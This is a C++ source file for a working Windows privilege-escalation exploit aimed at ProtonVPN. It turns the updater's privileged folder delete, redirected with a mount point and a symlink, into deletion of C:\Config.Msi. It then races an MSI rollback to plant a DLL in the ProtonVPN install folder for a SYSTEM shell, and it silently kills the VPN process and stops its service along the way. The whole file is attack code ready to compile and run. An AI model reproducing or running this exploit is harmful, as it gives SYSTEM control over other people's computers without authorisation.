// Exploit code to turn an arbitrary file/folder delete as SYSTEM into a SYSTEM EoP.
// Code by Abdelhamid Naceri (halov), with minor modifications.
// Recommended minimum of 4 processor cores.

#include <Windows.h>
#include <Shlwapi.h>
#include <Msi.h>
#include <PathCch.h>
#include <AclAPI.h>
#include <iostream>
#include "Win-Ops-Master.h"
#include "resource.h"
#include <vector>
#include <psapi.h>

#pragma comment(lib, "Msi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "PathCch.lib")
using namespace std;

const wchar_t pathOfDllDrop[] = L"C:\\Program Files\\Proton\\VPN\\v3.2.9\\profapi.dll";

OpsMaster op;
OpsMaster fop;

HANDLE hc;
HMODULE hm = GetModuleHandle(NULL);
HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_RBS1), L"rbs");
DWORD DllSize = SizeofResource(hm, res);
void* dllBuff = LoadResource(hm, res);
HRSRC res2 = FindResource(hm, MAKEINTRESOURCE(IDR_RBF1), L"rbf");
DWORD DllSize2 = SizeofResource(hm, res2);
void* dllBuff2 = LoadResource(hm, res2);
HANDLE hthread;



HANDLE hdir = NULL;
HANDLE hf = NULL;
std::wstring folder1path;
const wchar_t folder2path[] = L"C:\\test2";
const wchar_t exploitFileName[] = L"trick.txt";
const wchar_t* targetDir;

bool bitnessCheck()
{
	int dllBitness =
		*(unsigned __int16*)((char*)dllBuff2 + *(__int32*)((char*)dllBuff2 + 0x3c) + 4)
			== 0x8664 ? 64 : 32;

	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);
	int systemBitness = systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? 64 : 32;

	return dllBitness == systemBitness;
}

DWORD WINAPI install(void*) {
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI1), L"msi");
	DWORD DllSize = SizeofResource(hm, res);
	void* dllBuff = LoadResource(hm, res);
	wstring msipackage = L"C:\\Windows\\Temp\\" + op.GenerateRandomStr();
	HANDLE pkg = op.OpenFileNative(msipackage, GENERIC_WRITE | WRITE_DAC, ALL_SHARING, CREATE_ALWAYS);
	op.WriteFileNative(pkg, dllBuff, DllSize);
	CloseHandle(pkg);
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	
	UINT a = MsiInstallProduct(msipackage.c_str(), L"ACTION=INSTALL");
	printf("%d\n", a);
	MsiInstallProduct(msipackage.c_str(), L"REMOVE=ALL");
	DeleteFile(msipackage.c_str());
	return 0;
}
void callback() {

	//std::cout << "[+] I'm in" << std::endl;
	SetThreadPriority(GetCurrentThread(), REALTIME_PRIORITY_CLASS);
	//op.MoveFileToTempDir(hc,USE_SYSTEM_TEMP_DIR);
	op.MoveFileToTempDir(hc);

	//loop until the directory found
	hthread = CreateThread(NULL, NULL, install, NULL, NULL, NULL);
	HANDLE hd;
	do {
		hd = op.OpenDirectory("C:\\Config.Msi", GENERIC_READ, ALL_SHARING, OPEN_EXISTING);
	} while (!hd);

	//loop until the directory isn't found
	do {
		CloseHandle(hd);
		hd = op.OpenDirectory("C:\\Config.Msi", GENERIC_READ, ALL_SHARING, OPEN_EXISTING);
	} while (hd);
	CloseHandle(hd);
	//loop until the directory is created
	do {
		hd = op.OpenDirectory("C:\\Config.Msi", GENERIC_READ, ALL_SHARING, OPEN_EXISTING);
		CloseHandle(hd);
	} while (op.GetLastErr() != ERROR_ACCESS_DENIED);
	//release the lock
}

void callback1()
{
	fop.MoveFileToTempDir(hf);
	fop.CreateMountPoint(
		std::wstring(L"\\??\\") + folder1path,
		L"\\RPC CONTROL\\");
	std::wstring symlinkTarget = targetDir;
	symlinkTarget = symlinkTarget.substr(0, symlinkTarget.find_last_not_of(L'\\') + 1);
	symlinkTarget = std::wstring(L"\\??\\") + symlinkTarget + L"::$INDEX_ALLOCATION";
	std::wstring linkName = std::wstring(L"\\RPC CONTROL\\") + exploitFileName;
	fop.CreateNativeSymlink(linkName.c_str(), symlinkTarget.c_str());
}
void Trigger2()
{

	char buffer[MAX_PATH] = {};  
	GetModuleFileNameA(nullptr, buffer, MAX_PATH);
	
	std::string tmp(buffer);
	std::string cprocessname(tmp + " 1");
	

	WinExec(cprocessname.c_str(), SW_SHOW);

	Sleep(5000);
	WinExec("C:\\Program Files\\Proton\\VPN\\ProtonVPN.Launcher.exe", SW_SHOW);
}

int main(int argc, const char* argv[]) {

	std::string taskkillcmd = "cmd.exe /c taskkill /im ProtonVPN.exe /f";
	WinExec(taskkillcmd.c_str(), SW_HIDE);

	if (argc == 2 && !strcmp(argv[1], "1"))
	{
		if (!bitnessCheck())
		{
			std::wcout << L"[-] ERROR: This exploit was not compiled with correct bitness for this system." << std::endl;
			std::wcout << L"[-] Exiting." << std::endl;
			return 1;
		}

		if (GetFileAttributes(pathOfDllDrop) != INVALID_FILE_ATTRIBUTES)
		{
			std::wcout << L"[-] WARNING: This exploit will drop a DLL to " << pathOfDllDrop << L"." << std::endl;
			std::wcout << L"[-]          Be advised that a DLL has already been dropped to that location." << std::endl;
			std::wcout << L"[-]          Attempting to delete the existing DLL." << std::endl;
			if (!DeleteFile(pathOfDllDrop))
			{
				std::wcout << L"[-] FAIL: Unable to delete " << pathOfDllDrop << L"." << std::endl;
				std::wcout << L"[-] Exiting." << std::endl;
				return 1;
			}
			else
			{
				std::wcout << L"[+] Deleted " << pathOfDllDrop << L"." << std::endl;
			}
		}

		hc = op.OpenDirectory("C:\\Config.Msi", GENERIC_READ | DELETE,
			FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_ALWAYS);
		if (!hc)
		{
			std::cout << "[-] Failed to create C:\\Config.Msi. Usually this happens because it already exists." << std::endl;
			std::cout << "[-] We'll try to clear it by running the installer once." << std::endl;
			// Config.Msi probably already exists. We'll try to clear it out by running the install.
			install(NULL);
			hc = op.OpenDirectory("C:\\Config.Msi", GENERIC_READ | DELETE,
				FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_ALWAYS);
			if (hc)
			{
				std::cout << "[+] Successfully removed and recreated C:\\Config.Msi." << std::endl;
			}
			else
			{
				std::cout << "[-] FAIL: Unable to remove and recreate C:\\Config.Msi." << std::endl;
				std::cout << "[-] Before trying this EoP again, try triggering your vulnerability once" << std::endl;
				std::cout << "[-] in order to delete C:\\Config.Msi. Or, for testing purposes," << std::endl;
				std::cout << "[-] you can manually delete C:\\Config.Msi as an admin." << std::endl;
				std::cout << "[-] Note that C:\\Config.Msi typically has the Hidden and System attributes set." << std::endl;
				std::cout << "[-] WARNING: Delete C:\\Config.Msi at your own risk." << std::endl;
				std::cout << "[-] Exiting." << std::endl;
				return 1;
			}
		}

		if (!PathIsDirectoryEmpty(L"C:\\Config.Msi"))
		{
			std::cout << "[-] FAIL: C:\\Config.Msi already exists and is not empty. Cannot proceed." << std::endl;
			std::cout << "[-] Before trying this EoP again, delete C:\\Config.Msi." << std::endl;
			std::cout << "[-] WARNING: Delete C:\\Config.Msi at your own risk." << std::endl;
			std::cout << "[-] Exiting." << std::endl;
			return 1;
		}

		std::cout << "[+] Ready! Now trigger your vulnerability to delete C:\\Config.Msi." << std::endl;
		std::cout << "[+] Or, for testing purposes, manually delete C:\\Config.Msi as admin or SYSTEM." << std::endl;
		std::cout << "[+] This can be done from an elevated command prompt: rmdir C:\\Config.Msi" << std::endl;
		std::cout << "[+] or, running as admin or SYSTEM, invoke DeleteFile(L\"C:\\\\Config.Msi::$INDEX_ALLOCATION\");" << std::endl;

		SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
		SetThreadPriorityBoost(GetCurrentThread(), TRUE);      // This lets us maintain express control of our priority
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);


		op.CreateAndWaitLock(hc, callback);

		do {
			hc = op.OpenDirectory("C:\\Config.Msi", GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
				ALL_SHARING, OPEN_ALWAYS);
		} while (!hc);
		char buff[4096];
		DWORD retbt = 0;
		FILE_NOTIFY_INFORMATION* fn;
		WCHAR* extension;
		WCHAR* extension2;

		//std::cout << "[+] I'm in" << std::endl;

		do {
			ReadDirectoryChangesW(hc, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME,
				&retbt, NULL, NULL);
			fn = (FILE_NOTIFY_INFORMATION*)buff;
			size_t sz = fn->FileNameLength / sizeof(WCHAR);
			fn->FileName[sz] = '\0';
			extension = fn->FileName;
			PathCchFindExtension(extension, MAX_PATH, &extension2);
		} while (wcscmp(extension2, L".rbs") != 0);

		SetSecurityInfo(hc, SE_FILE_OBJECT, UNPROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL,
			NULL, NULL, NULL);
		while (!op.MoveFileToTempDir(hc));

		HANDLE cfg_h = op.OpenDirectory(L"C:\\Config.Msi", FILE_READ_DATA, ALL_SHARING, CREATE_NEW);
		HANDLE rbs = op.OpenFileNative(L"C:\\Config.Msi\\" + wstring(fn->FileName), GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
		op.WriteFileNative(rbs, dllBuff, DllSize);
		CloseHandle(rbs);
		CloseHandle(cfg_h);
		HANDLE rbf = op.OpenFileNative("C:\\Config.Msi\\5eeabb3.rbf", GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
		op.WriteFileNative(rbf, dllBuff2, DllSize2);
		CloseHandle(rbf);
		CloseHandle(hc);
		WaitForSingleObject(hthread, INFINITE);
		CloseHandle(hthread);

		if (GetFileAttributes(pathOfDllDrop) == INVALID_FILE_ATTRIBUTES)
		{
			std::wcout << L"[-] FAIL: DLL was not dropped to " << pathOfDllDrop << L".";
			return 1;
		}

		std::wcout << L"[+] SUCCESS: DLL was dropped to " << pathOfDllDrop << L"." << std::endl;
		std::wcout << L"[+] For a SYSTEM command prompt, open the On-Screen Keyboard osk.exe," << std::endl;
		std::wcout << L"[+] and then switch to the secure desktop, for example, with Ctrl+Alt+Delete." << std::endl;

		WinExec(taskkillcmd.c_str(), SW_HIDE);
		WinExec("sc stop \"ProtonVPN Service\"", SW_HIDE);
		Sleep(5000);

		std::wcout << L"[+] Done." << std::endl;
		WinExec("C:\\Program Files\\Proton\\VPN\\ProtonVPN.Launcher.exe", SW_SHOW);
		
		exit(-1);
		return 0;
	}
	else {

		wchar_t username[255 + 1];
		DWORD username_len = 255 + 1;
		GetUserNameW(username, &username_len);
		std::wstring usernameW(username);

		folder1path = L"C:\\Users\\" + usernameW + L"\\AppData\\Local\\ProtonVPN\\Updates";
		targetDir = L"C:\\Config.Msi";

		BOOL bCreateTargetDirSuccess = CreateDirectory(targetDir, NULL);       // In case target dir doesn't exist, we'll create it
		if (bCreateTargetDirSuccess)
		{
			std::wcout << L"[+] Created target dir: " << targetDir << std::endl;
		}

		CreateDirectory(folder2path, NULL);

		RemoveDirectory(folder1path.c_str());

		hdir = fop.OpenDirectory(folder1path.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, ALL_SHARING);

		std::wstring exploitFilePath = std::wstring(folder1path.c_str()) + L"\\" + exploitFileName;
		DeleteFileW(exploitFilePath.c_str());
		hf = fop.OpenFileNative(exploitFilePath.c_str(), MAXIMUM_ALLOWED, FILE_SHARE_READ | FILE_SHARE_WRITE, CREATE_ALWAYS);

		lock_ptr xlk = fop.CreateLock(hf, callback1);

		std::wcout << L"[+] Ready. Now run the privileged process to delete contents of " << folder1path << L"." << std::endl;
		std::wcout << L"[+] Or, for testing purposes, execute at an elevated command prompt: del /q " << folder1path << L"\\*" << std::endl;
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Trigger2, NULL, 0, NULL);

		xlk->WaitForLock(INFINITE);

		for (unsigned int i = 0; i < 500; i++)
		{
			Sleep(100);
			if (GetFileAttributesW(targetDir) == INVALID_FILE_ATTRIBUTES)
			{
				DWORD dwError = GetLastError();
				if (dwError == ERROR_FILE_NOT_FOUND)
				{
					std::wcout << L"[+] SUCCESS: Target folder deleted." << std::endl;
					std::wcout << L"[+] Done." << std::endl;
					
					break;
				}
			}
		}

		
	}
}